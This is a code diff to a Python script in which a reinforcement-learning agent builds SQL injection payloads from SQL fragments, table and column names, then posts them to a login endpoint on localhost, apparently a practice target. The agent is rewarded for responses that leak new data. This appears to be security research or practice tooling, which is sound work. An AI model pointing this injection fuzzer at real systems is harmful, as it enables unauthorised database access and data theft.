@@ -15,7 +15,9 @@ url = 'http://localhost.proxyman.io:3000/rest/user/login'
 # https://stackoverflow.com/questions/9265172/scrape-an-entire-website
 # os.system('wget -m -k -K -E -l 7 -t 6 -w 5 http://localhost:3000 -P ./scraped')
 
-feature_count = 10
+feature_count = 100
+
+successful_payloads = []
 
 visible_chars = [chr(i) for i in range(32, 127)]
 
@@ -23,7 +25,8 @@ with open('parsed-scrape.txt', 'r') as f:
     data = f.read()
 f.close()
 
-found_words = list(filter(lambda s: s != '', data.split(' ')))
+scraped_words = list(filter(lambda s: s != '', data.split(' ')))
+found_words = []
 
 with open('sql_list.txt', 'r') as f:
     data = f.read()
@@ -31,17 +34,28 @@ f.close()
 
 sql_list = data.split('\n')
 
+with open('tables.txt', 'r') as f:
+    data = f.read()
+f.close()
+
+tables = list(map(lambda table: table + ' ', data.split('\n')))
+
+with open('columns.txt', 'r') as f:
+    data = f.read()
+f.close()
+
+columns = list(map(lambda column: column + ' ', data.split('\n')))
+
 # with open('SQLiV3.csv', 'r') as f:
 #   data = f.read()
 # f.close()
 #
 # sql_injection_list = data.split('\n')
 
-visible_chars *= max(1, int(len(found_words)/len(visible_chars)))
-sql_list *= max(1, int(len(visible_chars)/len(sql_list)))
+# visible_chars *= max(1, int(len(found_words)/len(visible_chars)))
+sql_list *= max(3, int((len(tables) + len(columns))/len(sql_list)))
 
-
-mutation_actions = visible_chars + sql_list
+mutation_actions = sql_list + tables + columns
 
 # Half of action space terminates to prefer smaller queries, which implies
 # more payloads executed.
@@ -62,7 +76,7 @@ def __get_payload():
 
     chrs = state.tolist()
     chrs = [chr(int(i)) for i in chrs if i != 0.0]
-    return '\' ' + ''.join(chrs) + '--'
+    return ''.join(chrs)
 
 def __get_inverse_mutation_mask(with_replacements: bool = True):
     return range(len(replacement_actions), len(actions)) \
@@ -75,6 +89,11 @@ def __perform_termination_action():
     global state
 
     payload = __get_payload()
+    if(payload in successful_payloads):
+        state = dqn.create_empty_state()
+        return state, -1, True
+
+    print(payload)
     res = requests.post(url, data={
         'email': payload
     })
@@ -85,16 +104,24 @@ def __perform_termination_action():
 
     reward = 0
 
+    new_tokens = []
     for token in unique_tokens:
-        if(token not in found_words):
-            found_words.append(token)
-            reward += 1
+        if(token not in scraped_words):
+            if(token in found_words):
+                reward += 0.2
+            else:
+                found_words.append(token)
+                new_tokens.append(token)
+                reward += 1
+            
+            successful_payloads.append(payload)
 
     # Update the mask to account for potentially appended actions.
     __set_mutation_mask()
 
-    if(reward > 0):
+    if(len(new_tokens) > 0):
         print('\nPayload: ' + payload)
+        print('\nFound:', new_tokens)
 
     state = dqn.create_empty_state()
 
@@ -196,14 +223,14 @@ def __perform_action(action_index: int):
 
 dqn = DQN(
     RLHyperparametersModel(
-        gamma=0.98,
+        gamma=0.9,
         learning_rate=0.00025,
         batch_size=64,
-        training_episodes=10000,
+        training_episodes=50000,
         test_episodes=100,
         max_steps_per_episode=100,
         feature_count=feature_count,
-        action_count=len(actions) + 10000
+        action_count=len(actions)
     ),
     EpsilonModel(
         start=1.0,
